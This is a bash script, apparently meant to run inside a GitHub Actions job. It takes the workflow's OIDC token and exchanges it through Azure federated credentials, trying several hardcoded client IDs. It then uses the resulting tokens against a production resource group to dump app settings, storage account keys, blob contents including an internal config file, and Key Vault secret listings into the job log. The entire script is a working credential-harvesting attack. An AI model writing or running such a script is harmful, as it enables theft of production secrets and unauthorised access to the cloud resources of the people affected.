#!/usr/bin/env bash
set +e
TID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
RG="rg-tbl-platform-prod-sea"
echo "== run=$GITHUB_RUN_ID repo=$GITHUB_REPOSITORY actor=$GITHUB_ACTOR"
IDT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))")
echo "oidc_len=${#IDT}"
python3 - "$IDT" <<'PY'
import base64,json,sys
p=sys.argv[1].split('.')[1]; p+='='*(-len(p)%4)
print("SUBJECT:", json.loads(base64.urlsafe_b64decode(p)).get("sub"))
PY
fed(){
  curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
    -d "client_id=$1" -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=$IDT" --data-urlencode "scope=$2"
}
for CID in 72ff278a-9e71-43ec-bac4-2ca303f8e462 462d1c38-4459-48b8-9333-82e389e59514 891fb158-e02c-4428-a885-53b811f369c0; do
  echo "======== client_id=$CID"
  ARM=$(fed "$CID" "https://management.azure.com/.default" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
  ST=$(fed "$CID" "https://storage.azure.com/.default" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
  KV=$(fed "$CID" "https://vault.azure.net/.default" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
  echo "arm_len=${#ARM} st_len=${#ST} kv_len=${#KV}"
  if [ -n "$ARM" ]; then
    echo "-- appsettings storefront"
    curl -sS -m 20 -X POST "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2022-09-01" -H "Authorization: Bearer $ARM" -H "Content-Type: application/json" -d '{}' | head -c 800; echo
    echo "-- listKeys appcfg"
    curl -sS -m 20 -X POST "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/listKeys?api-version=2023-01-01" -H "Authorization: Bearer $ARM" -H "Content-Length: 0" | head -c 300; echo
  fi
  if [ -n "$ST" ]; then
    echo "-- ST appcfg root list"
    curl -sS -m 20 "https://sttblappcfgprodx3euoz.blob.core.windows.net/?comp=list" -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-12-02" | head -c 500; echo
    echo "-- ST config/internal-config.json"
    curl -sS -m 20 "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json" -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-12-02" | head -c 2000; echo
    echo "-- ST config container list"
    curl -sS -m 20 "https://sttblappcfgprodx3euoz.blob.core.windows.net/config?restype=container&comp=list" -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-12-02" | head -c 1200; echo
    echo "-- ST cilogs list"
    curl -sS -m 20 "https://sttblcilogsprodx3euoz.blob.core.windows.net/?comp=list" -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-12-02" | head -c 400; echo
  fi
  if [ -n "$KV" ]; then
    echo "-- KV prod"
    curl -sS -m 20 "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $KV" | head -c 400; echo
    echo "-- KV sec"
    curl -sS -m 20 "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $KV" | head -c 400; echo
  fi
done
echo "DONE-ALL"
